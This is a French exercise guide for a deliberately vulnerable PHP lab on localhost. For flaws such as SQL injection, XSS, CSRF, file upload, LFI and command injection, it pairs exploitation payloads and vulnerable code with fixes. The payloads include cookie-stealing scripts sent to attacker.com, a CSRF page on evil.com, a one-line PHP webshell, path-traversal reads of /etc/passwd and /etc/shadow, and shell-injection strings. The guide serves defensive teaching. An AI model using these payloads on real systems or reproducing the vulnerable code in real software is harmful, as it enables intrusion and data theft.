# Guide des exercices – Corrections des failles

> Application lab : `http://localhost:8080`  
> PhpMyAdmin : `http://localhost:8081`  
> Lancer avec : `docker-compose up -d`

---

## Sommaire des failles

| ID | Fichier | Type | Difficulté |
|----|---------|------|------------|
| [SQLi-01](#sqli-01) | `login.php` | Injection SQL dans le login | ⭐ |
| [SQLi-02](#sqli-02) | `article.php` | Injection SQL via GET | ⭐ |
| [SQLi-03](#sqli-03) | `search.php` | Injection SQL dans la recherche | ⭐ |
| [XSS-01](#xss-01) | `article.php` | XSS Stocké (commentaires) | ⭐⭐ |
| [XSS-02](#xss-02) | `article.php` | XSS Reflected (titre) | ⭐ |
| [XSS-03](#xss-03) | `search.php` | XSS Reflected (recherche) | ⭐ |
| [XSS-04](#xss-04) | `contact.php` | XSS Stocké (messages admin) | ⭐⭐ |
| [CSRF-01](#csrf-01) | `login.php` | CSRF sur formulaire de login | ⭐⭐ |
| [CSRF-02](#csrf-02) | `article.php` | CSRF sur commentaires | ⭐⭐ |
| [CSRF-03](#csrf-03) | `upload.php` | CSRF sur upload | ⭐⭐ |
| [CSRF-04](#csrf-04) | `contact.php` | CSRF sur formulaire de contact | ⭐⭐ |
| [CSRF-05](#csrf-05) | `dashboard.php` | CSRF sur changement de mot de passe | ⭐⭐⭐ |
| [SESSION-01](#session-01) | `config.php` | Cookies de session non sécurisés | ⭐⭐ |
| [SESSION-02](#session-02) | `login.php` | Pas de régénération d'ID de session | ⭐⭐ |
| [SESSION-03](#session-03) | `login.php` | Pas d'expiration de session | ⭐⭐ |
| [UPLOAD-01](#upload-01) | `upload.php` | Pas de vérification du type MIME réel | ⭐⭐ |
| [UPLOAD-02](#upload-02) | `upload.php` | Vérification extension insuffisante | ⭐⭐ |
| [UPLOAD-03](#upload-03) | `upload.php` | Stockage dans le web-root | ⭐⭐⭐ |
| [UPLOAD-04](#upload-04) | `upload.php` | Pas de limite de taille | ⭐ |
| [LFI-01](#lfi-01) | `page.php` | Local File Inclusion | ⭐⭐⭐ |
| [CMD-01](#cmd-01) | `exec.php` | Injection de commande système | ⭐⭐⭐ |
| [PASSWD-01](#passwd-01) | `register.php` | Mot de passe stocké en clair | ⭐ |
| [PASSWD-02](#passwd-02) | `dashboard.php` | Nouveau mot de passe stocké en clair | ⭐ |
| [IDOR-01](#idor-01) | `contact.php` | Accès admin sans authentification | ⭐⭐ |
| [IDOR-02](#idor-02) | `dashboard.php` | Accès au profil d'un autre utilisateur | ⭐⭐ |
| [CONFIG-01](#config-01) | `config.php` | Affichage des erreurs PHP activé | ⭐ |
| [VALIDATION-01](#validation-01) | `register.php` | Aucune validation des entrées | ⭐ |

---

## SQLi-01 – Injection SQL dans le formulaire de login

**Fichier :** `public/login.php`  
**Impact :** Connexion sans connaître le mot de passe, dump de la base de données

### Exploitation

Dans le champ "Nom d'utilisateur", saisir :
```
' OR '1'='1' --
```
La requête devient :
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...'
```
→ Retourne le premier utilisateur de la table (admin).

### Code vulnérable

```php
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = $pdo->query($query);
```

### Correction

```php
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
$stmt->execute([':username' => $username]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);

// Vérifier le mot de passe séparément avec password_verify()
if ($user && password_verify($password, $user['password'])) {
    // Connexion réussie
}
```

---

## SQLi-02 – Injection SQL via paramètre GET

**Fichier :** `public/article.php`  
**Impact :** Lecture de toute la base de données via UNION SELECT

### Exploitation

Dans l'URL, remplacer `?id=1` par :
```
?id=1 UNION SELECT 1,username,password,email,role,created_at FROM users--
```

### Code vulnérable

```php
$id = $_GET['id'];
$query = "SELECT a.*, u.username FROM articles a ... WHERE a.id = $id";
```

### Correction

```php
$id = (int)($_GET['id'] ?? 0);  // Forcer le cast en entier

$stmt = $pdo->prepare(
    "SELECT a.*, u.username FROM articles a LEFT JOIN users u ON a.author_id = u.id WHERE a.id = :id"
);
$stmt->execute([':id' => $id]);
$article = $stmt->fetch(PDO::FETCH_ASSOC);
```

---

## SQLi-03 – Injection SQL dans la recherche

**Fichier :** `public/search.php`  
**Impact :** Lecture de toute la base via UNION SELECT

### Exploitation

Dans la barre de recherche, saisir :
```
' UNION SELECT id,username,password,email,role,created_at FROM users--
```

### Code vulnérable

```php
$query_str = $_GET['q'];
$sql = "SELECT * FROM articles WHERE title LIKE '%$query_str%' OR content LIKE '%$query_str%'";
```

### Correction

```php
$q = $_GET['q'] ?? '';

$stmt = $pdo->prepare(
    "SELECT * FROM articles WHERE title LIKE :q OR content LIKE :q"
);
$stmt->execute([':q' => '%' . $q . '%']);
$results = $stmt->fetchAll(PDO::FETCH_ASSOC);
```

---

## XSS-01 – XSS Stocké dans les commentaires

**Fichier :** `public/article.php`  
**Impact :** Vol de cookies de session, défacement, redirection des visiteurs

### Exploitation

Dans le formulaire de commentaire, saisir comme contenu :
```html
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```
Le script est stocké en BDD et exécuté chez **tous les visiteurs** de l'article.

### Code vulnérable

```php
// En affichage :
echo $comment['content'];  // ❌ Pas d'échappement
```

### Correction

```php
// Lors de l'enregistrement : stocker brut (ou utiliser strip_tags)
// Lors de l'affichage : TOUJOURS échapper
echo htmlspecialchars($comment['content'], ENT_QUOTES | ENT_HTML5, 'UTF-8');
```

**Bonus – Ajouter un header CSP :**

```php
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
```

---

## XSS-02 – XSS dans le titre de l'article

**Fichier :** `public/article.php`  
**Impact :** XSS stocké si un admin crée un article avec du code dans le titre

### Code vulnérable

```html
<title><?= $article['title'] ?></title>
<h1><?= $article['title'] ?></h1>
```

### Correction

```php
$title = htmlspecialchars($article['title'], ENT_QUOTES | ENT_HTML5, 'UTF-8');
```
```html
<title><?= $title ?></title>
<h1><?= $title ?></h1>
```

---

## XSS-03 – XSS Reflected dans la recherche

**Fichier :** `public/search.php`  
**Impact :** Exécution de code dans le navigateur de la victime via un lien piégé

### Exploitation

Envoyer à la victime le lien :
```
http://localhost:8080/search.php?q=<script>alert('XSS')</script>
```

### Code vulnérable

```php
// Valeur du champ réaffichée sans échappement :
<input type="text" name="q" value="<?= $_GET['q'] ?? '' ?>">
<p>Résultats pour : <strong><?= $query_str ?></strong></p>
```

### Correction

```php
$q = htmlspecialchars($_GET['q'] ?? '', ENT_QUOTES | ENT_HTML5, 'UTF-8');
```
```html
<input type="text" name="q" value="<?= $q ?>">
<p>Résultats pour : <strong><?= $q ?></strong></p>
```

---

## XSS-04 – XSS Stocké dans les messages admin

**Fichier :** `public/contact.php`  
**Impact :** XSS s'exécute dans le panel admin – attaque ciblée sur les admins

### Exploitation

Envoyer un message de contact avec :
```html
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
```
Puis accéder à `contact.php?admin=1`.

### Correction

```php
echo htmlspecialchars($msg['message'], ENT_QUOTES | ENT_HTML5, 'UTF-8');
```

---

## CSRF-01 à CSRF-05 – Absence de tokens CSRF

**Fichiers :** `login.php`, `article.php`, `upload.php`, `contact.php`, `dashboard.php`  
**Impact :** Un site malveillant peut effectuer des actions à l'insu de l'utilisateur connecté

### Exploitation (CSRF-05 – changement de mot de passe)

Créer une page HTML sur un autre domaine :
```html
<!-- Sur http://evil.com/attack.html -->
<form id="f" method="POST" action="http://localhost:8080/dashboard.php">
    <input type="hidden" name="new_password" value="hacked123">
</form>
<script>document.getElementById('f').submit();</script>
```
Si la victime est connectée sur le lab et visite cette page, son mot de passe est changé.

### Correction (à appliquer sur tous les formulaires)

**Étape 1 – Générer le token (dans config.php) :**

```php
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
```

**Étape 2 – Ajouter dans chaque formulaire :**

```html
<input type="hidden" name="csrf_token"
       value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
```

**Étape 3 – Valider à la réception :**

```php
if (!isset($_POST['csrf_token']) ||
    !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    http_response_code(403);
    die('Token CSRF invalide');
}
// Renouveler le token
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));
```

---

## SESSION-01 – Cookies de session non sécurisés

**Fichier :** `public/config.php`  
**Impact :** Vol du cookie de session via XSS ou interception réseau

### Correction

```php
// Configurer AVANT session_start()
ini_set('session.cookie_httponly', 1);   // Inaccessible depuis JavaScript
ini_set('session.cookie_secure', 1);     // HTTPS uniquement
ini_set('session.cookie_samesite', 'Strict'); // Protection CSRF
ini_set('session.use_only_cookies', 1);  // Pas d'ID dans l'URL
ini_set('session.name', 'SESS_ID');      // Changer le nom par défaut

session_start();
```

---

## SESSION-02 – Pas de régénération d'ID de session

**Fichier :** `public/login.php`  
**Impact :** Session fixation – un attaquant force un ID de session puis l'exploite

### Correction

```php
// Juste après la vérification du mot de passe :
if ($user && password_verify($password, $user['password'])) {
    session_regenerate_id(true);  // ← CRUCIAL : régénère l'ID
    $_SESSION['user_id']  = $user['id'];
    $_SESSION['username'] = $user['username'];
    $_SESSION['logged_at'] = time();
}
```

---

## SESSION-03 – Pas d'expiration de session

**Fichier :** `public/login.php` + `dashboard.php`  
**Impact :** Une session reste valide indéfiniment

### Correction

```php
// Dans chaque page protégée, vérifier l'inactivité :
if (isset($_SESSION['logged_at']) && (time() - $_SESSION['logged_at']) > 1800) {
    session_destroy();
    header('Location: login.php?expired=1');
    exit;
}
$_SESSION['logged_at'] = time(); // Renouveler à chaque requête
```

---

## UPLOAD-01 & UPLOAD-02 – Validation insuffisante des fichiers

**Fichier :** `public/upload.php`  
**Impact :** Upload d'un webshell PHP → exécution de commandes sur le serveur

### Exploitation

1. Créer `shell.php` avec le contenu : `<?php system($_GET['cmd']); ?>`
2. Renommer en `shell.jpg`
3. Uploader via le formulaire
4. Accéder à `http://localhost:8080/uploads/shell.jpg?cmd=id`

### Correction

```php
$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'webp'];
$allowedMimes      = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];

$ext  = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime  = finfo_file($finfo, $_FILES['file']['tmp_name']);
finfo_close($finfo);

if (!in_array($ext, $allowedExtensions) || !in_array($mime, $allowedMimes)) {
    die('Type de fichier non autorisé');
}
```

---

## UPLOAD-03 – Stockage dans le web-root

**Fichier :** `public/upload.php`  
**Impact :** Les fichiers uploadés sont accessibles et exécutables via HTTP

### Correction

```php
// Stocker HORS du web-root
$uploadDir = '/var/www/uploads/';  // Pas dans /var/www/html/

// Renommer avec un nom aléatoire
$filename = bin2hex(random_bytes(16)) . '.' . $ext;
$destination = $uploadDir . $filename;

move_uploaded_file($_FILES['file']['tmp_name'], $destination);

// Servir via un script PHP dédié (serve.php) qui vérifie les droits
```

---

## UPLOAD-04 – Pas de limite de taille

**Fichier :** `public/upload.php`  
**Impact :** Déni de service par saturation du disque

### Correction

```php
$maxSize = 5 * 1024 * 1024; // 5 Mo

if ($_FILES['file']['size'] > $maxSize) {
    die('Fichier trop volumineux (max 5 Mo)');
}
if ($_FILES['file']['error'] !== UPLOAD_ERR_OK) {
    die('Erreur lors de l\'upload');
}
```

---

## LFI-01 – Local File Inclusion

**Fichier :** `public/page.php`  
**Impact :** Lecture de fichiers sensibles du serveur, potentiellement exécution de code (log poisoning)

### Exploitation

```
/page.php?p=../../../../etc/passwd
/page.php?p=../../../../etc/shadow
/page.php?p=php://filter/convert.base64-encode/resource=config
```

### Code vulnérable

```php
$p = $_GET['p'] ?? 'home';
include($p . '.php');
```

### Correction

```php
// Whitelist stricte des pages autorisées
$allowedPages = ['home', 'about', 'contact-info'];
$p = $_GET['p'] ?? 'home';

if (!in_array($p, $allowedPages)) {
    $p = 'home';
}

// Double vérification avec realpath()
$file     = __DIR__ . '/pages/' . $p . '.php';
$realFile = realpath($file);
$base     = realpath(__DIR__ . '/pages/');

if ($realFile === false || strpos($realFile, $base) !== 0) {
    die('Page introuvable');
}

include $realFile;
```

---

## CMD-01 – Injection de commande système

**Fichier :** `public/exec.php`  
**Impact :** Exécution de commandes arbitraires sur le serveur, prise de contrôle complète

### Exploitation

```
/exec.php?host=127.0.0.1; id
/exec.php?host=127.0.0.1 && cat /etc/passwd
/exec.php?host=127.0.0.1 | ls /var/www/html
/exec.php?host=`whoami`
```

### Code vulnérable

```php
$host = $_GET['host'];
exec("ping -c 1 " . $host, $output_lines);
```

### Correction

```php
$host = $_GET['host'] ?? '';

// Valider le format IP ou nom de domaine
if (!filter_var($host, FILTER_VALIDATE_IP) &&
    !preg_match('/^[a-zA-Z0-9\-\.]+$/', $host)) {
    die('Hôte invalide');
}

// Échapper les arguments shell
exec("ping -c 1 " . escapeshellarg($host), $output_lines);
```

**Mieux encore : désactiver exec dans php.ini**

```ini
disable_functions = exec,system,shell_exec,passthru,proc_open,popen
```

---

## PASSWD-01 & PASSWD-02 – Mots de passe en clair

**Fichiers :** `public/register.php`, `public/dashboard.php`  
**Impact :** Si la BDD est compromise, tous les mots de passe sont lisibles directement

### Correction

```php
// Lors de l'inscription/changement :
$hashedPassword = password_hash($password, PASSWORD_ARGON2ID);
$stmt->execute([$username, $email, $hashedPassword]);

// Lors de la vérification :
if ($user && password_verify($password, $user['password'])) {
    // OK
}
```

---

## IDOR-01 – Accès admin sans authentification

**Fichier :** `public/contact.php`  
**Impact :** N'importe qui peut lire tous les messages privés avec `?admin=1`

### Code vulnérable

```php
if (isset($_GET['admin'])) {  // ❌ Aucune vérification d'identité
    $messages = $pdo->query("SELECT * FROM contact_messages")->fetchAll();
}
```

### Correction

```php
// Vérifier que l'utilisateur est connecté ET qu'il est admin
if (isset($_SESSION['user_id']) && $_SESSION['role'] === 'admin') {
    $messages = $pdo->query("SELECT * FROM contact_messages ORDER BY created_at DESC")->fetchAll();
}
```

---

## IDOR-02 – Accès au profil d'un autre utilisateur

**Fichier :** `public/dashboard.php`  
**Impact :** Un utilisateur connecté peut voir les données (et le mot de passe en clair) de n'importe qui

### Exploitation

Se connecter en tant que `alice`, puis accéder à `dashboard.php?user_id=1` pour voir le profil admin.

### Code vulnérable

```php
$viewId = $_GET['user_id'] ?? $_SESSION['user_id'];
// ❌ Pas de vérification que $viewId == $_SESSION['user_id']
```

### Correction

```php
// Un utilisateur ne peut voir que SON propre profil
// (sauf s'il est admin)
$viewId = $_SESSION['user_id'];

if (isset($_GET['user_id']) && $_SESSION['role'] === 'admin') {
    $viewId = (int)$_GET['user_id'];
}
```

---

## CONFIG-01 – Affichage des erreurs PHP

**Fichier :** `public/config.php`  
**Impact :** Révèle les chemins du serveur, la structure de la BDD, les versions

### Code vulnérable

```php
ini_set('display_errors', 1);
error_reporting(E_ALL);
```

### Correction

```php
// En production :
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', '/var/log/php/error.log');
error_reporting(E_ALL);
```

---

## VALIDATION-01 – Aucune validation des entrées à l'inscription

**Fichier :** `public/register.php`  
**Impact :** Comptes avec emails invalides, mots de passe vides, usernames vides

### Correction

```php
$username = trim($_POST['username'] ?? '');
$email    = trim($_POST['email']    ?? '');
$password = $_POST['password']      ?? '';

$errors = [];

if (strlen($username) < 3 || strlen($username) > 50) {
    $errors[] = "Le nom doit contenir entre 3 et 50 caractères.";
}
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    $errors[] = "Email invalide.";
}
if (strlen($password) < 8) {
    $errors[] = "Le mot de passe doit contenir au moins 8 caractères.";
}
if (!preg_match('/[A-Z]/', $password) || !preg_match('/[0-9]/', $password)) {
    $errors[] = "Le mot de passe doit contenir une majuscule et un chiffre.";
}

if (!empty($errors)) {
    foreach ($errors as $e) {
        echo "<p>$e</p>";
    }
    exit;
}
```

---

## Pour aller plus loin

### Outils à utiliser en parallèle

```bash
# Scanner les injections SQL
sqlmap -u "http://localhost:8080/search.php?q=test" --dbs

# Intercepter les requêtes (Burp Suite)
# Proxy : localhost:8080 → Burp → site

# Scanner XSS
# Extension navigateur : XSS Auditor (dev tools)
```

### Ordre recommandé pour les exercices

1. **Débutant** : CONFIG-01 → PASSWD-01 → VALIDATION-01 → IDOR-01
2. **Intermédiaire** : SQLi-01 → SQLi-02 → XSS-03 → CSRF-05 → SESSION-01
3. **Avancé** : SQLi-03 (UNION) → XSS-01 (Stored) → UPLOAD-03 → LFI-01 → CMD-01
